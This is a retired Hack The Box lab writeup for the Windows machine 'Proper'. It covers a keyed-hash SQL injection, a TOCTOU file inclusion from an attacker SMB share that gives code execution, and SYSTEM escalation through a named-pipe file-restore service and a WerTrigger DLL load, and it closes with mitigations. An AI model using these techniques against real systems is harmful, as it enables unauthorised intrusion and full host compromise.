---
machine: Proper
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, iis, sqli, keyed-hash, toctou, smb, named-pipe, wertrigger, privesc]
---

# Proper — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The AJAX request to `Products-Ajax.php` uses `order` and a hash `h`; when a parameter is missing, a PHP crash reveals the code and the `SECURE_PARAM_SALT` used for signing. The hash must be recomputed on every request (SQLmap `--eval` or custom scripting) to exploit the SQLi, crack the hashes and reach `/licenses`. There, an LFI/RFI with a time-of-check/time-of-use (TOCTOU) race over an SMB resource executes code as `web`. For root, the `Cleanup` service is analyzed (NSSM plus `server.exe`/`client.exe` over named pipes): the client restores files as SYSTEM and allows arbitrary writes; WerTrigger then forces Windows Error Reporting to load a DLL and yields SYSTEM. *Beyond Root* documents other paths, including CVE-2021-1732.

## Reconnaissance

```bash
nmap -Pn -sCV -p80 <IP>
```

- `80`: Microsoft IIS 10.0.

```bash
echo '<IP> proper.htb' | sudo tee -a /etc/hosts
gobuster dir -u http://proper.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php
```

## Enumeration

The site is a licensing application. The main page loads `Products-Ajax.php` with `order` and `h`; `order=id desc` goes straight into the query. The `h` value looks like a keyed hash. Omitting a parameter (for example `order`) makes PHP crash, and the error message shows the code with `SECURE_PARAM_SALT`.

With the key, the hash is recomputed for each request. `sqlmap` automates it with `--eval`, and a script can sign every parameter.

The hash is recomputed on every request with a custom script; `sqlmap` can automate it with `--eval`, but the algorithm must exactly replicate the server's.

The SQLi dumps users and hashes; cracking them opens `/licenses`.

## Foothold

`/licenses` has a template or language parameter that includes files. The inclusion can point to an SMB resource. The application reads the file twice (check and use), enabling a TOCTOU: the first read returns a benign file and the second a PHP payload, which executes as `web`.

```text
\\<LHOST>\share\file.php
```

## Lateral movement

There is no second host. `web` enumerates services and permissions. WinPEAS shows the `Cleanup` service, which runs `C:\Program Files\Cleanup\server.exe` through NSSM. Client and server communicate over the `cleanupPipe` named pipe; the server runs as SYSTEM.

## Privilege escalation

`client.exe` encrypts files in `Downloads` and stores them in `C:\ProgramData\Cleanup` with a base64 name. On restore, the server writes the file to the path encoded in that name, with SYSTEM privileges. Manipulating the base64 name writes an arbitrary file.

That write places `phoneinfo.dll` in `System32`, and a controlled crash makes Windows Error Reporting load the DLL as SYSTEM.

```powershell
C:\Program Files\Cleanup\client.exe -R C:\Windows\System32\<FILE>
```

*Beyond Root* shows alternative arbitrary read and write paths, and CVE-2021-1732 as another escalation route.

## Evidence

- `Products-Ajax.php` with `order` and `h`, and a crash revealing `SECURE_PARAM_SALT`.
- SQLi reproduced with the recomputed hash and cracked hashes.
- `/licenses` access and LFI/RFI over SMB.
- TOCTOU and PHP execution as `web`.
- `Cleanup` service and `cleanupPipe`.
- Arbitrary write as SYSTEM and `phoneinfo.dll` loaded by WER.
- `whoami` as `nt authority\system`.

## Lessons learned

- Signing a parameter does not prevent injection when the key leaks.
- A keyed hash must be recomputed per request; that does not make it safe.
- A TOCTOU between check and use turns an inclusion into RCE.
- A named-pipe service that restores files can write as SYSTEM.
- WerTrigger is a generic way to load a DLL from a privileged process.

## Mitigations and detection

- Parameterize queries and never rely on hashes to sanitize SQL.
- Do not reveal keys or internal errors; log without details.
- Validate paths and use identifiers; avoid separate check and use.
- Restrict the Cleanup service and validate restored names.
- Block DLL loads from user paths and review WerTrigger.
- Alert on invalid `h` requests, System32 writes and WER crashes.

## References

- [0xdf — Proper](https://0xdf.gitlab.io/2021/08/21/htb-proper.html)
- [IppSec — Proper](https://www.youtube.com/watch?v=yqNSTM9oGZE)
- [Hack The Box — Proper](https://app.hackthebox.com/machines/proper)
- [NVD — CVE-2021-1732](https://nvd.nist.gov/vuln/detail/CVE-2021-1732)
- [Knowledge — WerTrigger and SYSTEM escalation](../../../knowledge/windows/wertrigger-privesc.en.md)
